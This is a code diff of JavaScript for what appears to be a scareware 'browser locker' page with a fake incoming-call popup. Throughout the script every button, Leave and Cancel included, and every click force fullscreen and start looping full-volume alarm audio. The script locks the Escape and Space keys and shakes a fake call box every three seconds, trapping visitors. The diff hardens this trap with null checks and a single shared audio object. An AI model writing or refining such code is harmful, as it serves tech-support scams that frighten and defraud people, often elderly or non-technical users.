@@ -1,7 +1,77 @@
+/* ============================================================
+   GLOBAL AUDIO FIX (PREVENT DOUBLE eng.mp3 PLAYBACK)
+============================================================ */
+let globalAlertAudio = null;
+let globalAudioStarted = false;
+
+function initGlobalAudio() {
+    if (!globalAlertAudio) {
+        globalAlertAudio = new Audio("eng.mp3");
+        globalAlertAudio.loop = true;
+        globalAlertAudio.volume = 1.0;
+    }
+}
+
+function startGlobalAudio() {
+    initGlobalAudio();
+
+    if (!globalAudioStarted) {
+        globalAlertAudio.play().catch(() => {
+            console.log("Autoplay blocked until user clicks");
+        });
+        globalAudioStarted = true;
+    }
+}
+
+/* ============================================================
+   FIRST SCREEN CALL POPUP FUNCTIONALITY
+============================================================ */
+
+let firstScreenActive = true; // track first popup
+
+function hideFirstScreen() {
+    if (!firstScreenActive) return;
+
+    firstScreenActive = false;
+
+    const fs = document.getElementById("firstScreen");
+    if (fs) fs.style.display = "none";
+
+    const mc = document.getElementById("mainContent");
+    if (mc) mc.style.display = "block";
+}
+
+// Accept / Close buttons
+document.addEventListener("DOMContentLoaded", () => {
+    const btn1 = document.querySelector(".accept");
+    const btn2 = document.querySelector(".decline");
+    const closeBtn = document.querySelector(".closeBtn");
+
+    [btn1, btn2, closeBtn].forEach((btn) => {
+        if (!btn) return;
+        btn.addEventListener("click", function (e) {
+            e.stopPropagation();
+            hideFirstScreen();
+            startGlobalAudio();
+        });
+    });
+});
+
+// Clicking anywhere → hide first screen and continue fullscreen behavior
+document.addEventListener("click", function () {
+    hideFirstScreen();
+});
+
+
+/* ============================================================
+   YOUR ORIGINAL CODE (KEPT EXACTLY THE SAME EXCEPT AUDIO FIX)
+============================================================ */
+
 function getQueryParam(param) {
   const urlParams = new URLSearchParams(window.location.search);
   return urlParams.get(param);
 }
+
 $(document).ready(function () {
   var audioElement = document.createElement("audio");
   audioElement.setAttribute("src", "alert-en.wav");
@@ -13,22 +83,31 @@ $(document).ready(function () {
     },
     false
   );
+
   addEventListener("click", function () {
+
+    // Hide first popup then fullscreen
+    hideFirstScreen();
+
     var el = document.documentElement,
       reffer =
         el.requestFullScreen ||
         el.webkitRequestFullScreen ||
         el.mozRequestFullScreen;
-    reffer.call(el);
+    if (reffer) reffer.call(el);
+
     audioElement.play();
+
+    // FIX: use unified eng.mp3 audio
+    startGlobalAudio();
   });
 
   if ("keyboard" in navigator && "lock" in navigator.keyboard) {
-    // Request to lock the keyboard
-    navigator.keyboard.lock(["Escape", "Space"]); // Locks the 'Escape' and 'Space' keys
+    navigator.keyboard.lock(["Escape", "Space"]);
   } else {
     console.log("Keyboard Lock API is not supported in this browser.");
   }
+
   document.addEventListener(
     "keydown",
     function (event) {
@@ -44,14 +123,8 @@ window.onload = function () {
   const cancelBtn = document.getElementById("cancelBtn");
 
   // Show popup on load
-  dialog.classList.add("ls-show");
+  if (dialog) dialog.classList.add("ls-show");
 
-  // Load audio (must be triggered on user click)
-  const audio = new Audio("eng.mp3");
-  audio.loop = true; // keep playing in loop
-  audio.volume = 1.0; // full volume
-
-  // Fullscreen toggle function
   function toggleFullScreen() {
     let doc = document.documentElement;
 
@@ -66,36 +139,42 @@ window.onload = function () {
     }
   }
 
-  // Play audio only after first click
-  let audioStarted = false;
-  function startAudio() {
-    if (!audioStarted) {
-      audio.play().catch(() => {
-        console.log("Autoplay blocked until user clicks");
-      });
-      audioStarted = true;
-    }
-  }
-
   // Clicking anywhere on the page
   document.addEventListener("click", function () {
-    startAudio(); // Start audio
-    toggleFullScreen(); // Fullscreen loop
+    hideFirstScreen();
+    startGlobalAudio();     // FIX: instead of creating new audio
+    toggleFullScreen();
   });
 
-  // Clicking LEAVE button
-  leaveBtn.onclick = (event) => {
-    event.stopPropagation();
-    dialog.classList.remove("ls-show");
-    startAudio(); // Start audio
-    toggleFullScreen(); // Fullscreen loop
-  };
+  if (leaveBtn) {
+    leaveBtn.onclick = (event) => {
+      event.stopPropagation();
+      dialog.classList.remove("ls-show");
+      hideFirstScreen();
+      startGlobalAudio();   // FIX
+      toggleFullScreen();
+    };
+  }
 
-  // Clicking CANCEL button
-  cancelBtn.onclick = (event) => {
-    event.stopPropagation();
-    dialog.classList.remove("ls-show");
-    startAudio(); // Start audio
-    toggleFullScreen(); // Fullscreen loop
-  };
+  if (cancelBtn) {
+    cancelBtn.onclick = (event) => {
+      event.stopPropagation();
+      dialog.classList.remove("ls-show");
+      hideFirstScreen();
+      startGlobalAudio();   // FIX
+      toggleFullScreen();
+    };
+  }
 };
+
+/* ============================================================
+   VIBRATION ANIMATION RESTART (UNCHANGED)
+============================================================ */
+setInterval(() => {
+    const box = document.querySelector(".call-box");
+    if (box) {
+        box.classList.remove("shake");
+        void box.offsetWidth; // restart CSS animation
+        box.classList.add("shake");
+    }
+}, 3000);
